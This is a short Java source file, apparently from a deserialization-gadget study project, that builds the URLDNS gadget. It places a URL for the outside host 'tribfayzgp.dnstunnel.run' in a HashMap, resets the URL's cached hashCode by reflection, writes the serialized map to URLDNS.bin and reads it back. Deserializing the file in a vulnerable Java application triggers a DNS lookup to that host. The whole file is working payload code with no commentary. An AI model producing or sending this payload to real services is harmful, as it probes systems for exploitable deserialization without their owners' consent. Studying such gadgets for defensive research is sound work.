package com.trganda.gadget.urldns;

import com.trganda.gadget.utils.Reflections;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class URLDNS {

    private static class SilenceURLStreamHandler extends URLStreamHandler {

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        public int hashCode(URL u) {
            return -1;
        }
    }

    public static void main(String[] args) throws Exception {
        URL url = new URL(null, "http://tribfayzgp.dnstunnel.run", new SilenceURLStreamHandler());

        HashMap<URL, String> map = new HashMap<>();
        map.put(url, "1");

        Reflections.setFieldValue(url, "hashCode", -1);

        ObjectOutputStream oos =
                new ObjectOutputStream(Files.newOutputStream(Paths.get("target/URLDNS.bin")));
        oos.writeObject(map);

        ObjectInputStream ois =
                new ObjectInputStream(Files.newInputStream(Paths.get("target/URLDNS.bin")));
        ois.readObject();
    }
}
